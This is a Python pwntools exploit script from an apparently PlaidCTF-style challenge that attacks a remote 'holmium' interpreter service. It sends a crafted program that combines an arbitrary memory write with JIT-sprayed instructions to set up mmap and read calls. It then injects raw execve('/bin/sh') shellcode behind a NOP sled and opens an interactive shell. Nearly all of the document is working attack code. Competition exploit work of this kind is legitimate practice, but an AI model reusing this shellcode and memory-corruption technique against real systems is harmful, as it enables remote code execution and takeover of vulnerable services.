# Exploit written by setuid0
from pwn import *

exploit = """// 0x26, 0x2a, 0x2a
(Main) = (
    (
        Exploit
        11111111 41414141
        22222222 41414141
        33333333 41414141
        1304007 41414141
        55555555 41414141
        66666666 41414141
        77777777 41414141
        88888888 41414141
    )
    (
        Exploit
        //585878732 652987596
        585863312 652972176
        // xor eax,eax
        // mov al,0x40
        652984369 652951728
        // shl eax,1
        // shl eax,1
        652992721 652992721
        // shl eax,1
        // shl eax,1
        652992721 652992721
        // shl eax,1
        // shl eax,1
        652992721 652992721
        // shl eax,1
        // shl eax,1
        652992721 652992721
        // shl eax,1
        // push rax; pop rsi
        652992721 652959312
        // shl eax,1
        // shl eax,1
        652992721 652992721
        // shl eax,1
        // shl eax,1
        652992721 652992721
        // shl eax,1
        // shl eax,1
        652992721 652992721
        // shl eax,1
        // push rax; pop rdi
        652992721 652959568
        // xor eax,eax
        // mov al,10
        652984369 652937904
        // xor edx,edx
        // mov dl,7
        652988977 652937138
        // syscall
        // push rsi; pop rdx
        652936463 652958294
        // push rcx; pop rsi
        // xor edi,edi
        652959313 653000497
        // syscall
        652936463 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
        3435973836 3435973836
    )
    // Leak test, Ctr(1, N=2, 1049301)
    (* 1945917207 3591923955)
    // Arbitrary write
    // Lam(7) = 2515077533 * 916807923
    // Executed as mem->node[1304007] = 4211158
    ((* 2515077533 916807923) 4211158)
)"""

s = remote("holmium.chal.pwni.ng", 1337)
# s = remote("x64", 31337)
s.recvuntil("-\n")
s.send("%d main.hvm\n" % len(exploit))

s.recvuntil("main.hvm\n")
s.send(exploit)
s.recvuntil("Running...")

s.send("\x90"*0x400 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
s.interactive()
